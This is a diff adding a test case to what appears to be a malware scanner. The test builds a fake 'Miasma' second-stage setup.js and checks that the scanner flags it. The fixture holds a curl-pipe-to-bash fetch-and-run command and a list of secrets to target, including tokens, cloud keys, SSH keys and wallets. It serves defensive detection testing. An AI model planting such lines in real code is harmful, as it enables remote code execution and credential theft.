@@ -437,6 +437,32 @@ try {
   fs.rmSync(tmpRedHatBindingGypRoot, { recursive: true, force: true });
 }
 
+const tmpMiasmaSecondStageRoot = fs.mkdtempSync(path.join(__dirname, "tmp-miasma-second-stage-"));
+try {
+  fs.mkdirSync(path.join(tmpMiasmaSecondStageRoot, ".github"), { recursive: true });
+  fs.writeFileSync(
+    path.join(tmpMiasmaSecondStageRoot, ".github", "setup.js"),
+    [
+      "const crypto = require('crypto');",
+      "const fs = require('fs');",
+      "const cp = require('child_process');",
+      "const stage = crypto.createDecipheriv('aes-256-cbc', key, iv);",
+      "const payload = Buffer.from('stub', 'base64');",
+      "const out = '/tmp/miasma-stage-' + Date.now() + '.js';",
+      "fs.writeFileSync(out, payload);",
+      "cp.exec('curl -fsSL https://bun.sh/install | bash');",
+      "const targets = ['GITHUB_TOKEN', 'NPM_TOKEN', 'AWS_ACCESS_KEY_ID', 'VAULT_TOKEN', '.docker/config.json', '.kube/config', 'id_rsa', 'wallet'];",
+      "cp.execFile('bun', [out]);"
+    ].join("\n")
+  );
+  const miasmaSecondStage = scanTarget(tmpMiasmaSecondStageRoot);
+  assert.strictEqual(miasmaSecondStage.risk, "likely-exposed");
+  assert(miasmaSecondStage.findings.some((finding) => finding.type === "miasma-github-setup-payload"));
+  assert(miasmaSecondStage.findings.some((finding) => finding.type === "miasma-second-stage-shape"));
+} finally {
+  fs.rmSync(tmpMiasmaSecondStageRoot, { recursive: true, force: true });
+}
+
 const tmpMiasmaEditedWaveRoot = fs.mkdtempSync(path.join(__dirname, "tmp-miasma-edited-wave-"));
 try {
   fs.writeFileSync(
